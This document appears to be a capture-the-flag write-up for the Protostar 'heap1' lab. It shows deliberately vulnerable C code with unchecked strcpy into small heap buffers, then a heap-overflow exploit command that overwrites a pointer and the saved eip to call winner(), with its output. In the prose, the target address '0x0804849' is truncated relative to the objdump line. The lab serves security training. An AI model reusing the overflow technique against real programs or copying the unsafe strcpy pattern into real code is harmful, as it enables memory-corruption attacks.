### Source code

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <sys/types.h>

  

struct internet {
  int priority;
  char *name;
};

void winner()
{
  printf("and we have a winner @ %d\n", time(NULL));
}

int main(int argc, char **argv)
{
  struct internet *i1, *i2, *i3;

  i1 = malloc(sizeof(struct internet));
  i1->priority = 1;
  i1->name = malloc(8);

  i2 = malloc(sizeof(struct internet));
  i2->priority = 2;
  i2->name = malloc(8);

  strcpy(i1->name, argv[1]);
  strcpy(i2->name, argv[2]);

  printf("and that's a wrap folks!\n");
}
```

### Solution 

The objective of this challenge is to call the function `winner` located at the address `0x0804849`

```
user@protostar:/tmp$ objdump -t /opt/protostar/bin/heap1 | grep winner
08048494 g     F .text 	00000025              winner
```

To achieve that, we are going to use the first call to `strcpy` to change the address stored in `i2->name` by the address of the saved `eip`. It will allow us to change its value with the second call to `strcpy` and replace it by the address of the function `winner`.

Our exploit will look like this:

 - `argv[1]`
  - `AAAAAAAA`: to fill up `i1->name`
  - `BBBBBBBB`: to overwrite the metadata of the chunk `i2`
  - `CCCC`: to overwrite `i2->priority`
  - `@saved eip`: to overwrite the address in `i2->name`
 - `argv[2]`
  - `@winner`: to replace the value of the saved `eip`
 
```
user@protostar:/tmp$ heap1 $(python -c "print 'A'*8 + 'B'*8 + 'C'*4 + '\x9c\xf6\xff\xbf'") $(python -c "print '\x94\x84\x04\x08'*2")
and that's a wrap folks!
and we have a winner @ 1473117910
and we have a winner @ 1473117910
